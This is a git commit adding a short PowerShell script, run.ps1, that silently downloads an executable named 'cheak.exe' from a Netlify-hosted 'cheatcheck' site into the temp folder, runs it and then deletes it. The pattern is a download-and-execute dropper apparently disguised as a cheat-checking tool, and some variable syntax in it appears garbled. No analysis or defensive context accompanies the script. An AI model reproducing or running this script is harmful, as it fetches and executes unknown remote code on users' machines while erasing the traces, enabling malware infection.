d3e242aa5d14894b8cccd89a0c35ad0366be5830
tibizda068-collab <tibizda068@gmail.com>
2026-06-15 23:28:40 +0300

    Add files via upload

---
+++ run.ps1
@@ -0,0 +1,6 @@
+[Net.ServicePointManager]::SecurityProtocol = 3072
+\(ProgressPreference = 'SilentlyContinue'
+
+irm https://cheatcheck.netlify.app/cheak.exe -OutFile \)env:TEMP\c.exe
+Start-Process \(env:TEMP\c.exe
+Remove-Item \)env:TEMP\c.exe
